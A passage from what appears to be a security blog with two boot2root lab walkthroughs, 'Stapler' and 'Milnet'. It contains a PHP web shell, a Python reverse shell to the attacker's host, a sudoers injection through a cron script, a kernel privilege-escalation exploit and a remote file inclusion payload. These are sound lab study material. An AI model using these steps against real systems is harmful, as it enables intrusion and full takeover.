</span><span class='line'>+------------+------------------------------------+</span></code></pre></td></tr></table></div></figure>


<p>I tried cracking them with john but it took so long so I aborted it. Instead, I leveraged the fact that MySQL was running as root to write a rudimentary shell on the filesystem:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>MySQL [wordpress]&gt; Select "&lt;?php echo shell_exec($_GET['cmd']);?&gt;" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
</span><span class='line'>Query OK, 1 row affected (0.04 sec)</span></code></pre></td></tr></table></div></figure>


<p>I tested the shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>https://192.168.217.141:12380/blogblog/wp-content/uploads/shell.php?cmd=whoami
</span><span class='line'>www-data </span></code></pre></td></tr></table></div></figure>


<p>Then I used one of PentestMonkey&rsquo;s awesome one-liners to upgrade the shell, after setting up a listener:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>https://192.168.217.141:12380/blogblog/wp-content/uploads/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.217.132",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</span><span class='line'>
</span><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.141] 39846
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ python -c 'import pty;pty.spawn("/bin/bash")'
</span><span class='line'>www-data@red:/var/www/https/blogblog/wp-content/uploads$</span></code></pre></td></tr></table></div></figure>


<p>A bit convoluted and relying on the enumeration / access from previous attempts, but I got another low privileged shell. I proceeded to do more enumeration in order to find a different way of elevating privileges. One of the things I did was search for files owned by root and writeable by everyone:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>find / -type f -user root -perm /o=w 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p>I scrolled through the output until I found something interesting:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/local/sbin/cron-logrotate.sh
</span><span class='line'>www-data@red:/$ cat /usr/local/sbin/cron-logrotate.sh
</span><span class='line'>cat /usr/local/sbin/cron-logrotate.sh
</span><span class='line'>#Simon, you really need to-do something about this</span></code></pre></td></tr></table></div></figure>


<p>A cronjob run by root that we can write to! I added the following line that adds www-data to sudoers:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo "echo 'www-data  ALL=NOPASSWD: ALL' &gt;&gt; /etc/sudoers" &gt;&gt; /usr/local/sbin/cron-logrotate.sh</span></code></pre></td></tr></table></div></figure>


<p>Waited a bit and then:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo su
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>


<p>Lastly, we can get root just by using an exploit. I ran my <a href="https://github.com/chousensha/linux_privcheck">linux_privcheck.py</a> against the kernel version:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python linux_privcheck.py 
</span><span class='line'>Kernel version is 4.4.0-21-generic
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: BPF Privilege Escalation
</span><span class='line'>CVE: CVE-2016-4557
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/39772/
</span><span class='line'>###########################################
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: Netfilter target_offset Out-of-Bounds Privilege Escalation
</span><span class='line'>CVE: N/A
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/40049/
</span><span class='line'>###########################################
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: AF_PACKET Race Condition Privilege Escalation
</span><span class='line'>CVE: CVE-2016-8655
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/40871/
</span><span class='line'>###########################################
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: DCCP Double-Free Privilege Escalation
</span><span class='line'>CVE: CVE-2017-6074
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/41458/
</span><span class='line'>###########################################</span></code></pre></td></tr></table></div></figure>


<p>I used the first exploit, downloaded the files to my machine, and then uploaded them to the Stapler box by using the TFTP that I&rsquo;ve identified previously:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tftp 192.168.217.141
</span><span class='line'>tftp&gt; put compile.sh
</span><span class='line'>Sent 160 bytes in 0.1 seconds
</span><span class='line'>tftp&gt; put doubleput.c
</span><span class='line'>Sent 4330 bytes in 0.0 seconds
</span><span class='line'>tftp&gt; put hello.c
</span><span class='line'>Sent 2272 bytes in 0.1 seconds
</span><span class='line'>tftp&gt; put suidhelper.c
</span><span class='line'>Sent 267 bytes in 0.0 seconds</span></code></pre></td></tr></table></div></figure>


<p>On my shell, I looked around and saw that the files were uploaded to the <code>/home/www</code> directory. I copied them to /tmp, compiled and ran the exploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./compile.sh
</span><span class='line'>doubleput.c: In function 'make_setuid':
</span><span class='line'>doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
</span><span class='line'>    .insns = (__aligned_u64) insns,
</span><span class='line'>             ^
</span><span class='line'>doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
</span><span class='line'>    .license = (__aligned_u64)""
</span><span class='line'>
</span><span class='line'>$ ./doubleput
</span><span class='line'>starting writev
</span><span class='line'>woohoo, got pointer reuse
</span><span class='line'>writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.
</span><span class='line'>suid file detected, launching rootshell...
</span><span class='line'>we have root privs now...
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></code></pre></td></tr></table></div></figure>


<p>Getting root, a 3rd time! Thanks g0tmi1k for an awesome boot2root!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Q: How does a hacker fix a function     \
</span><span class='line'>| which                                   |
</span><span class='line'>|                                         |
</span><span class='line'>| doesn't work for all of the elements in |
</span><span class='line'>\ its domain? A: He changes the domain.   /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hacking the Milnet]]></title>
    <link href="http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet/"/>
    <updated>2018-05-13T06:55:41-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is a story-based VM inspired by a book! Let&rsquo;s jump straight in!</p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   2048 9b:b5:21:38:96:7f:85:bd:1b:aa:9a:70:cf:db:cd:36 (RSA)
</span><span class='line'>|   256 93:30:be:c2:af:dd:81:a8:25:2b:57:e5:01:49:91:57 (ECDSA)
</span><span class='line'>|_  256 37:40:2b:cc:27:ae:89:22:d0:d2:65:65:c4:9b:53:42 (EdDSA)
</span><span class='line'>80/tcp open  http    lighttpd 1.4.35
</span><span class='line'>|_http-server-header: lighttpd/1.4.35
</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/milnet/milnet.jpg" title="milnet" alt="milnet"></p>

<p>Nothing much on this site, some German text and a credits page. I ran Nikto on it with no significant finds. The site is running lighttpd/1.4.35 and it has an info.php page displaying phpinfo() output. There is also a line mentioning a RFI vulnerability for the info.php page, but I wasn&rsquo;t able to exploit that.</p>

<p>I ran dirb next, with no further luck. So I looked more closely at the phpinfo page. The allow_url_include directive is on, so RFI should definitely be possible somewhere, but I couldn&rsquo;t find extra pages. I tried OWASP ZAP next, and it helped with finding the vulnerable entry point:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/milnet/zap.jpg" title="owasp zap rfi" alt="owasp zap rfi"></p>

<p>I used Burp to craft a request directly to the content.php page, by trying to direct the route parameter to a page on my machine where the Python web server would serve a reverse shell, but it didn&rsquo;t work, so I took a step back to see how the website is using the route parameter. I just navigated on it with Burp on and observed the request:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /content.php HTTP/1.1
</span><span class='line'>Host: 192.168.217.140
</span><span class='line'>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>Referer: http://192.168.217.140/nav.php
</span><span class='line'>DNT: 1
</span><span class='line'>Connection: close
</span><span class='line'>Upgrade-Insecure-Requests: 1
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 10
</span><span class='line'>
</span><span class='line'>route=bomb</span></code></pre></td></tr></table></div></figure>


<p>So I intercepted this and changed route to point to <a href="http://192.168.217.132:8000/shell.php.">http://192.168.217.132:8000/shell.php.</a> This is my attacking machine where I was serving the shell on port 8000 and waiting for it on port 8888. This time I did get an incoming request:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -m SimpleHTTPServer 8000
</span><span class='line'>Serving HTTP on 0.0.0.0 port 8000 ...
</span><span class='line'>192.168.217.140 - - [13/May/2018 08:16:54] code 404, message File not found
</span><span class='line'>192.168.217.140 - - [13/May/2018 08:16:54] "GET /shell.php.php HTTP/1.0" 404 -</span></code></pre></td></tr></table></div></figure>


<p>An extra .php extension is appended to the request. So I changed the RFI to:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>route=http://192.168.217.132:8000/shell</span></code></pre></td></tr></table></div></figure>


<p>And this time things went smoothly:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.217.140 - - [13/May/2018 08:29:41] "GET /shell.php HTTP/1.0" 200 -</span></code></pre></td></tr></table></div></figure>


<p>I have a shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.140] 57412
</span><span class='line'>Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
</span><span class='line'> 14:29:41 up  1:38,  0 users,  load average: 0.13, 0.07, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>


<p>I proceeded with some enumeration:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls /home
</span><span class='line'>langman
</span><span class='line'>$ ls /home/langman
</span><span class='line'>SDINET</span></code></pre></td></tr></table></div></figure>


<p>There are lots of text files in here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls
</span><span class='line'>DCA_Circular.310-P115-1
</span><span class='line'>DefenseCode_Unix_WildCards_Gone_Wild.txt
</span><span class='line'>FUN18.TXT
</span><span class='line'>compserv.txt
</span><span class='line'>fips-index.
</span><span class='line'>fips_500_166.txt
</span><span class='line'>fips_500_169.txt
</span><span class='line'>fips_500_170.txt
</span><span class='line'>fips_500_171.txt
</span><span class='line'>pentagon.txt
</span><span class='line'>sec-8901.txt
</span><span class='line'>sec-8902.txt
</span><span class='line'>sec-9540.txt
</span><span class='line'>sec-9720.txt</span></code></pre></td></tr></table></div></figure>


<p>These are various army-related documents which you can read at your own leisure. More interesting is the DefenseCode_Unix_WildCards_Gone_Wild.txt document, which lists different code execution techniques by exploiting Unix wildcards. Because this was such an interesting read, I&rsquo;ve included it here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
<span class='line-number'>310</span>
<span class='line-number'>311</span>
<span class='line-number'>312</span>
<span class='line-number'>313</span>
<span class='line-number'>314</span>
<span class='line-number'>315</span>
<span class='line-number'>316</span>
<span class='line-number'>317</span>
<span class='line-number'>318</span>
<span class='line-number'>319</span>
<span class='line-number'>320</span>
<span class='line-number'>321</span>
<span class='line-number'>322</span>
<span class='line-number'>323</span>
<span class='line-number'>324</span>
<span class='line-number'>325</span>
<span class='line-number'>326</span>
<span class='line-number'>327</span>
<span class='line-number'>328</span>
<span class='line-number'>329</span>
<span class='line-number'>330</span>
<span class='line-number'>331</span>
<span class='line-number'>332</span>
<span class='line-number'>333</span>
<span class='line-number'>334</span>
<span class='line-number'>335</span>
<span class='line-number'>336</span>
<span class='line-number'>337</span>
<span class='line-number'>338</span>
<span class='line-number'>339</span>
<span class='line-number'>340</span>
<span class='line-number'>341</span>
<span class='line-number'>342</span>
<span class='line-number'>343</span>
<span class='line-number'>344</span>
<span class='line-number'>345</span>
<span class='line-number'>346</span>
<span class='line-number'>347</span>
<span class='line-number'>348</span>
<span class='line-number'>349</span>
<span class='line-number'>350</span>
<span class='line-number'>351</span>
<span class='line-number'>352</span>
<span class='line-number'>353</span>
<span class='line-number'>354</span>
<span class='line-number'>355</span>
<span class='line-number'>356</span>
<span class='line-number'>357</span>
<span class='line-number'>358</span>
<span class='line-number'>359</span>
<span class='line-number'>360</span>
<span class='line-number'>361</span>
<span class='line-number'>362</span>
<span class='line-number'>363</span>
<span class='line-number'>364</span>
<span class='line-number'>365</span>
<span class='line-number'>366</span>
<span class='line-number'>367</span>
<span class='line-number'>368</span>
<span class='line-number'>369</span>
<span class='line-number'>370</span>
<span class='line-number'>371</span>
<span class='line-number'>372</span>
<span class='line-number'>373</span>
<span class='line-number'>374</span>
<span class='line-number'>375</span>
<span class='line-number'>376</span>
<span class='line-number'>377</span>
<span class='line-number'>378</span>
<span class='line-number'>379</span>
<span class='line-number'>380</span>
<span class='line-number'>381</span>
<span class='line-number'>382</span>
<span class='line-number'>383</span>
<span class='line-number'>384</span>
<span class='line-number'>385</span>
<span class='line-number'>386</span>
<span class='line-number'>387</span>
<span class='line-number'>388</span>
<span class='line-number'>389</span>
<span class='line-number'>390</span>
<span class='line-number'>391</span>
<span class='line-number'>392</span>
<span class='line-number'>393</span>
<span class='line-number'>394</span>
<span class='line-number'>395</span>
<span class='line-number'>396</span>
<span class='line-number'>397</span>
<span class='line-number'>398</span>
<span class='line-number'>399</span>
<span class='line-number'>400</span>
<span class='line-number'>401</span>
<span class='line-number'>402</span>
<span class='line-number'>403</span>
<span class='line-number'>404</span>
<span class='line-number'>405</span>
<span class='line-number'>406</span>
<span class='line-number'>407</span>
<span class='line-number'>408</span>
<span class='line-number'>409</span>
<span class='line-number'>410</span>
<span class='line-number'>411</span>
<span class='line-number'>412</span>
<span class='line-number'>413</span>
<span class='line-number'>414</span>
<span class='line-number'>415</span>
<span class='line-number'>416</span>
<span class='line-number'>417</span>
<span class='line-number'>418</span>
<span class='line-number'>419</span>
<span class='line-number'>420</span>
